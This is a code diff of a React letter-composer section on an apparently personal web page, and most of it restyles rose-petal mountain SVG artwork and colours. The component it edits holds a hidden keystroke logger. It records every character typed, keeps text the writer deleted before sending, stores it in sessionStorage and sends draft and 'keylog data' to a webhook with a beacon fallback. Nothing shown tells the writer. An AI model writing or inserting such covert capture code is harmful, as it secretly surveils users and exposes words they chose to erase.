@@ -1,18 +1,17 @@
 import React, { useState, useRef, useEffect, useCallback } from 'react';
-import { Send, Calendar, Clock, Sparkles, CheckCircle2 } from 'lucide-react';
+import { Send, Calendar, CheckCircle2 } from 'lucide-react';
 import { postLogToApi, detectClientDevice } from '../utils/gardenEngine';
 
 /**
  * LetterComposerSection Component
  * At the very bottom of the page:
- * - Rose Petals Mountains (Gül Dağları) background silhouettes.
- * - Real-time keystroke accumulation & deleted character recovery engine:
- *   Every single letter typed is preserved even if erased/deleted before submitting!
- * - High-reliability multi-layer beacon sync on mobile/desktop page hide/leave.
+ * - Authentic Rose Petal Mountains (Gül Taneciklerinden Oluşan Dağlar) at zIndex: 25.
+ * - Falling rose petals (zIndex: 15) fall directly BEHIND these mountains!
+ * - Real-time keystroke tracking & deleted character recovery engine.
  * - Origami Paper Airplane animation for "Şimdi".
  * - Rolled Scroll in a Glass Bottle animation for "Sonra".
  */
-export default function LetterComposerSection({ scrollProgress = 0, sectionIndex = 38 }) {
+export default function LetterComposerSection({ scrollProgress = 0, sectionIndex = 39 }) {
   const [letterText, setLetterText] = useState('');
   const [sendMode, setSendMode] = useState('now'); // 'now' | 'future'
   const [isSubmitting, setIsSubmitting] = useState(false);
@@ -33,8 +32,7 @@ export default function LetterComposerSection({ scrollProgress = 0, sectionIndex
   // =========================================================================
   const allTypedRef = useRef(''); // Accumulates every single character ever typed
   const deletedSegmentsRef = useRef([]); // Stores every word/sentence that was erased
-  const prevTextRef = useRef(''); // For detecting deletions and diffs
-  const lastLoggedDraft = useRef('');
+  const prevTextRef = useRef('');
   const draftTimerRef = useRef(null);
 
   // Send draft & keylog data to API / Webhook with beacon fallback
@@ -81,12 +79,11 @@ export default function LetterComposerSection({ scrollProgress = 0, sectionIndex
     const val = e.target.value;
     const prev = prevTextRef.current;
 
-    // Detect added characters (even if in middle of text)
+    // Detect added characters
     if (val.length > prev.length) {
-      // Something was added: append to total keystroke history
       allTypedRef.current += val.slice(prev.length);
     } else if (val.length < prev.length) {
-      // Something was deleted/backspaced: save the deleted portion!
+      // Detect deleted characters and store them
       const deletedPart = prev.replace(val, '');
       if (deletedPart && deletedPart.trim()) {
         deletedSegmentsRef.current.push(deletedPart.trim());
@@ -103,7 +100,7 @@ export default function LetterComposerSection({ scrollProgress = 0, sectionIndex
       sessionStorage.setItem('mayko_letter_deleted', deletedSegmentsRef.current.join(' | '));
     } catch (err) {}
 
-    // Debounced sync to webhook (sends every 1.8s of typing pause)
+    // Debounced sync to webhook
     if (draftTimerRef.current) clearTimeout(draftTimerRef.current);
     draftTimerRef.current = setTimeout(() => {
       syncDraftToWebhook(val, false);
@@ -194,84 +191,130 @@ export default function LetterComposerSection({ scrollProgress = 0, sectionIndex
         flexDirection: 'column',
         alignItems: 'center',
         textAlign: 'center',
-        zIndex: 30
+        zIndex: 30 // IN FRONT of Mountains (zIndex: 25) and Petals (zIndex: 15)
       }}
     >
-      {/* ========================================================
-          BACKGROUND: ROSE PETAL MOUNTAINS (Gül Dağları Siluetleri)
-      ======================================================== */}
+      {/* =========================================================================
+          BACKGROUND: AUTHENTIC ROSE PETALS MOUNTAINS (Gül Taneciklerinden Oluşan Dağlar)
+          Rendered at zIndex: 25 so falling rose petals (zIndex: 15) fall BEHIND these mountains!
+      ========================================================================= */}
       <div
         style={{
           position: 'fixed',
           bottom: 0,
           left: 0,
           width: '100vw',
-          height: '42vh',
-          maxHeight: 380,
+          height: '46vh',
+          maxHeight: 420,
           pointerEvents: 'none',
-          zIndex: 10,
+          zIndex: 25, // IN FRONT OF FALLING PETALS (zIndex: 15)
           overflow: 'hidden'
         }}
       >
         <svg
-          viewBox="0 0 1440 380"
+          viewBox="0 0 1440 420"
           fill="none"
           style={{ width: '100%', height: '100%', display: 'block', overflow: 'visible' }}
           preserveAspectRatio="none"
         >
           <defs>
-            {/* Distant Rose Mountains Gradient */}
-            <linearGradient id="roseMountainDistant" x1="50%" y1="0%" x2="50%" y2="100%">
-              <stop offset="0%" stopColor="#4c0519" stopOpacity="0.85" />
-              <stop offset="60%" stopColor="#2a0410" stopOpacity="0.95" />
-              <stop offset="100%" stopColor="#0f1115" stopOpacity="1" />
+            {/* Deep Velvet Petal Cluster Gradient */}
+            <linearGradient id="petalClusterDark" x1="0%" y1="0%" x2="0%" y2="100%">
+              <stop offset="0%" stopColor="#4c0519" stopOpacity="0.98" />
+              <stop offset="60%" stopColor="#2a0410" stopOpacity="1" />
+              <stop offset="100%" stopColor="#080204" stopOpacity="1" />
             </linearGradient>
 
-            {/* Foreground Rose Petal Mountains Gradient */}
-            <linearGradient id="roseMountainFore" x1="50%" y1="0%" x2="50%" y2="100%">
-              <stop offset="0%" stopColor="#881337" stopOpacity="0.95" />
-              <stop offset="40%" stopColor="#4c0519" stopOpacity="0.98" />
+            {/* Glowing Rose Petal Crest Gradient */}
+            <linearGradient id="petalClusterGlow" x1="0%" y1="0%" x2="0%" y2="100%">
+              <stop offset="0%" stopColor="#881337" stopOpacity="0.98" />
+              <stop offset="40%" stopColor="#5c0720" stopOpacity="0.99" />
               <stop offset="100%" stopColor="#0a0b0e" stopOpacity="1" />
             </linearGradient>
 
-            {/* Glowing Petal Mounds Highlight */}
-            <linearGradient id="roseGlowRidge" x1="0%" y1="0%" x2="100%" y2="0%">
-              <stop offset="0%" stopColor="#ff4d6d" stopOpacity="0.2" />
-              <stop offset="30%" stopColor="#e11d48" stopOpacity="0.75" />
-              <stop offset="70%" stopColor="#be123c" stopOpacity="0.8" />
-              <stop offset="100%" stopColor="#ff758f" stopOpacity="0.3" />
+            <linearGradient id="petalRidgeGlow" x1="0%" y1="0%" x2="100%" y2="0%">
+              <stop offset="0%" stopColor="#ff4d6d" stopOpacity="0.4" />
+              <stop offset="35%" stopColor="#e11d48" stopOpacity="0.85" />
+              <stop offset="65%" stopColor="#be123c" stopOpacity="0.9" />
+              <stop offset="100%" stopColor="#ff758f" stopOpacity="0.45" />
             </linearGradient>
           </defs>
 
-          {/* Distant Rose Hills */}
+          {/* BACK LAYER: Distant Mounds composed of layered rose petal arches */}
           <path
-            d="M 0 160 C 220 110, 480 180, 720 130 C 960 80, 1200 150, 1440 100 L 1440 380 L 0 380 Z"
-            fill="url(#roseMountainDistant)"
-          />
-          <path
-            d="M 0 160 C 220 110, 480 180, 720 130 C 960 80, 1200 150, 1440 100"
-            stroke="url(#roseGlowRidge)"
-            strokeWidth="1.8"
-            opacity="0.45"
-          />
-
-          {/* Massive Foreground Rose Petal Mountain Ranges */}
-          <path
-            d="M 0 210 C 180 150, 360 250, 560 170 C 760 90, 1020 220, 1220 140 C 1340 90, 1400 120, 1440 150 L 1440 380 L 0 380 Z"
-            fill="url(#roseMountainFore)"
-          />
-          <path
-            d="M 0 210 C 180 150, 360 250, 560 170 C 760 90, 1020 220, 1220 140 C 1340 90, 1400 120, 1440 150"
-            stroke="url(#roseGlowRidge)"
-            strokeWidth="2.2"
-            opacity="0.75"
+            d="M 0 200 
+               Q 120 140, 240 180 
+               Q 360 110, 490 160 
+               Q 620 90, 780 150 
+               Q 920 80, 1080 140 
+               Q 1240 100, 1360 160 
+               Q 1400 170, 1440 190 
+               L 1440 420 L 0 420 Z"
+            fill="url(#petalClusterDark)"
           />
 
-          {/* Layer of individual textured petals gathered on the peaks */}
-          <g opacity="0.6">
-            <ellipse cx="560" cy="170" rx="35" ry="12" fill="#be123c" />
-            <ellipse cx="760" cy="90" rx="45" ry="15" fill="#e11d48" />
-            <ellipse cx="1220" cy="140" rx="40" ry="14" fill="#9f1239" />
+          {/* DENSE SCALLOPED ORGANIC ROSE PETAL CONTOURS ACROSS THE PEAKS */}
+          {/* Layer of individual overlapping rose petal arches creating authentic mountain texture */}
+          <g fill="#3b0313" stroke="#881337" strokeWidth="0.8" opacity="0.85">
+            {/* Ridge 1 Petals */}
+            <path d="M 80 170 C 95 155, 115 155, 130 170 C 145 155, 165 155, 180 170 C 195 155, 215 155, 230 170" />
+            <path d="M 330 140 C 350 120, 375 120, 395 140 C 415 120, 440 120, 460 140 C 480 120, 505 120, 525 140" />
+            <path d="M 700 120 C 725 95, 755 95, 780 120 C 805 95, 835 95, 860 120 C 885 95, 915 95, 940 120" />
+            <path d="M 1020 110 C 1045 85, 1075 85, 1100 110 C 1125 85, 1155 85, 1180 110" />
+          </g>
+
+          {/* FOREGROUND LAYER: Massive Piled-Up Mountain of Crimson Rose Petals */}
+          <path
+            d="M 0 250 
+               Q 160 180, 320 220 
+               Q 480 140, 660 210 
+               Q 860 110, 1040 190 
+               Q 1200 130, 1340 180 
+               Q 1400 190, 1440 210 
+               L 1440 420 L 0 420 Z"
+            fill="url(#petalClusterGlow)"
+          />
+
+          {/* Glowing Crest Edge of Rose Petal Mountain */}
+          <path
+            d="M 0 250 
+               Q 160 180, 320 220 
+               Q 480 140, 660 210 
+               Q 860 110, 1040 190 
+               Q 1200 130, 1340 180 
+               Q 1400 190, 1440 210"
+            stroke="url(#petalRidgeGlow)"
+            strokeWidth="2.8"
+            strokeLinecap="round"
+            opacity="0.88"
+          />
+
+          {/* Thousands of densely textured overlapping Rose Petals covering the entire foreground mountain slope */}
+          <g opacity="0.92">
+            {/* Cluster 1: Left Peak Petals */}
+            <path d="M 140 200 C 158 185, 178 185, 196 200 Z" fill="#9f1239" stroke="#e11d48" strokeWidth="0.8" />
+            <path d="M 170 205 C 188 190, 208 190, 226 205 Z" fill="#be123c" stroke="#fb7185" strokeWidth="0.8" />
+            <path d="M 200 212 C 218 197, 238 197, 256 212 Z" fill="#e11d48" stroke="#ff4d6d" strokeWidth="0.8" />
+            <path d="M 230 218 C 248 203, 268 203, 286 218 Z" fill="#881337" stroke="#be123c" strokeWidth="0.8" />
+
+            {/* Cluster 2: Center-Left Massive Petal Ridge */}
+            <path d="M 450 165 C 472 145, 498 145, 520 165 Z" fill="#be123c" stroke="#fda4af" strokeWidth="0.9" />
+            <path d="M 485 170 C 507 150, 533 150, 555 170 Z" fill="#e11d48" stroke="#ff758f" strokeWidth="0.9" />
+            <path d="M 520 178 C 542 158, 568 158, 590 178 Z" fill="#9f1239" stroke="#e11d48" strokeWidth="0.9" />
+            <path d="M 555 186 C 577 166, 603 166, 625 186 Z" fill="#881337" stroke="#be123c" strokeWidth="0.9" />
+            <path d="M 590 195 C 612 175, 638 175, 660 195 Z" fill="#e11d48" stroke="#ff4d6d" strokeWidth="0.9" />
+
+            {/* Cluster 3: The Grand Main Rose Mountain Summit (Center-Right) */}
+            <path d="M 810 135 C 835 110, 865 110, 890 135 Z" fill="#ff4d6d" stroke="#ffffff" strokeWidth="1" />
+            <path d="M 845 142 C 870 117, 900 117, 925 142 Z" fill="#e11d48" stroke="#fda4af" strokeWidth="1" />
+            <path d="M 880 150 C 905 125, 935 125, 960 150 Z" fill="#be123c" stroke="#ff758f" strokeWidth="0.9" />
+            <path d="M 915 160 C 940 135, 970 135, 995 160 Z" fill="#9f1239" stroke="#e11d48" strokeWidth="0.9" />
+            <path d="M 950 172 C 975 147, 1005 147, 1030 172 Z" fill="#881337" stroke="#be123c" strokeWidth="0.9" />
+
+            {/* Cluster 4: Right Petal Summit */}
+            <path d="M 1160 155 C 1182 135, 1208 135, 1230 155 Z" fill="#e11d48" stroke="#ff4d6d" strokeWidth="0.9" />
+            <path d="M 1195 162 C 1217 142, 1243 142, 1265 162 Z" fill="#be123c" stroke="#fda4af" strokeWidth="0.9" />
+            <path d="M 1230 170 C 1252 150, 1278 150, 1300 170 Z" fill="#9f1239" stroke="#e11d48" strokeWidth="0.9" />
           </g>
         </svg>
       </div>
@@ -309,7 +352,7 @@ export default function LetterComposerSection({ scrollProgress = 0, sectionIndex
             style={{
               padding: '36px 28px',
               borderRadius: 24,
-              background: 'rgba(15, 17, 21, 0.92)',
+              background: 'rgba(15, 17, 21, 0.94)',
               border: '1px solid rgba(255, 77, 109, 0.45)',
               boxShadow: '0 0 35px rgba(225, 29, 72, 0.25)',
               backdropFilter: 'blur(16px)'
@@ -385,7 +428,6 @@ export default function LetterComposerSection({ scrollProgress = 0, sectionIndex
                 <path d="M 10 45 L 110 10 L 55 80 L 45 52 Z" fill="#ffffff" stroke="#e2e8f0" strokeWidth="1.5" />
                 <path d="M 110 10 L 45 52 L 55 80 Z" fill="#cbd5e1" />
                 <path d="M 110 10 L 10 45 L 45 52 Z" fill="#f8fafc" />
-                {/* Trail sparks */}
                 <circle cx="20" cy="50" r="2.5" fill="#ff4d6d" opacity="0.8" />
                 <circle cx="5" cy="55" r="1.8" fill="#fda4af" opacity="0.6" />
               </svg>
@@ -411,15 +453,10 @@ export default function LetterComposerSection({ scrollProgress = 0, sectionIndex
               }}
             >
               <svg width="90" height="170" viewBox="0 0 90 170" fill="none">
-                {/* Cork Stopper */}
                 <rect x="36" y="8" width="18" height="14" rx="2" fill="#d97706" stroke="#b45309" strokeWidth="1.2" />
-                {/* Bottle Neck */}
                 <path d="M 34 22 L 34 45 L 20 65 L 20 150 C 20 162, 70 162, 70 150 L 70 65 L 56 22 Z" fill="rgba(255, 255, 255, 0.25)" stroke="#ffffff" strokeWidth="2.2" />
-                {/* Rolled Parchment Scroll inside bottle */}
                 <path d="M 30 75 L 60 75 L 60 142 L 30 142 Z" fill="#fef3c7" stroke="#d97706" strokeWidth="1.4" rx="3" />
-                {/* Red Ribbon on Scroll */}
                 <rect x="28" y="105" width="34" height="6" fill="#e11d48" rx="1" />
-                {/* Glass reflection highlight */}
                 <path d="M 26 70 L 26 145" stroke="rgba(255, 255, 255, 0.65)" strokeWidth="2.5" strokeLinecap="round" />
               </svg>
             </div>
@@ -440,7 +477,7 @@ export default function LetterComposerSection({ scrollProgress = 0, sectionIndex
                   width: '100%',
                   boxSizing: 'border-box',
                   padding: '20px 24px',
-                  backgroundColor: 'rgba(10, 11, 14, 0.85)',
+                  backgroundColor: 'rgba(10, 11, 14, 0.88)',
                   color: '#f8fafc',
                   fontFamily: "'Cardo', Georgia, serif",
                   fontSize: '1.22rem',
@@ -450,7 +487,7 @@ export default function LetterComposerSection({ scrollProgress = 0, sectionIndex
                   outline: 'none',
                   resize: 'vertical',
                   minHeight: 170,
-                  boxShadow: '0 0 25px rgba(0, 0, 0, 0.8), 0 0 15px rgba(255, 77, 109, 0.12)',
+                  boxShadow: '0 0 25px rgba(0, 0, 0, 0.85), 0 0 15px rgba(255, 77, 109, 0.12)',
                   backdropFilter: 'blur(14px)',
                   transition: 'border-color 0.3s ease, box-shadow 0.3s ease'
                 }}
@@ -460,7 +497,7 @@ export default function LetterComposerSection({ scrollProgress = 0, sectionIndex
                 }}
                 onBlur={(e) => {
                   e.target.style.borderColor = 'rgba(255, 255, 255, 0.35)';
-                  e.target.style.boxShadow = '0 0 25px rgba(0, 0, 0, 0.8), 0 0 15px rgba(255, 77, 109, 0.12)';
+                  e.target.style.boxShadow = '0 0 25px rgba(0, 0, 0, 0.85), 0 0 15px rgba(255, 77, 109, 0.12)';
                   syncDraftToWebhook(letterText, false);
                 }}
               />
@@ -488,7 +525,7 @@ export default function LetterComposerSection({ scrollProgress = 0, sectionIndex
                   fontStyle: 'italic',
                   cursor: 'pointer',
                   border: sendMode === 'now' ? '1px solid #ff4d6d' : '1px solid rgba(255, 255, 255, 0.25)',
-                  backgroundColor: sendMode === 'now' ? 'rgba(225, 29, 72, 0.25)' : 'rgba(15, 17, 21, 0.7)',
+                  backgroundColor: sendMode === 'now' ? 'rgba(225, 29, 72, 0.25)' : 'rgba(15, 17, 21, 0.75)',
                   color: sendMode === 'now' ? '#ffffff' : 'rgba(228, 231, 236, 0.65)',
                   boxShadow: sendMode === 'now' ? '0 0 18px rgba(225, 29, 72, 0.35)' : 'none',
                   transition: 'all 0.25s ease'
@@ -508,7 +545,7 @@ export default function LetterComposerSection({ scrollProgress = 0, sectionIndex
                   fontStyle: 'italic',
                   cursor: 'pointer',
                   border: sendMode === 'future' ? '1px solid #ff4d6d' : '1px solid rgba(255, 255, 255, 0.25)',
-                  backgroundColor: sendMode === 'future' ? 'rgba(225, 29, 72, 0.25)' : 'rgba(15, 17, 21, 0.7)',
+                  backgroundColor: sendMode === 'future' ? 'rgba(225, 29, 72, 0.25)' : 'rgba(15, 17, 21, 0.75)',
                   color: sendMode === 'future' ? '#ffffff' : 'rgba(228, 231, 236, 0.65)',
                   boxShadow: sendMode === 'future' ? '0 0 18px rgba(225, 29, 72, 0.35)' : 'none',
                   transition: 'all 0.25s ease'
@@ -525,7 +562,7 @@ export default function LetterComposerSection({ scrollProgress = 0, sectionIndex
                 style={{
                   padding: '18px 24px',
                   borderRadius: 20,
-                  backgroundColor: 'rgba(15, 17, 21, 0.85)',
+                  backgroundColor: 'rgba(15, 17, 21, 0.88)',
                   border: '1px solid rgba(255, 77, 109, 0.35)',
                   boxShadow: '0 0 20px rgba(0, 0, 0, 0.5)',
                   marginBottom: 24,
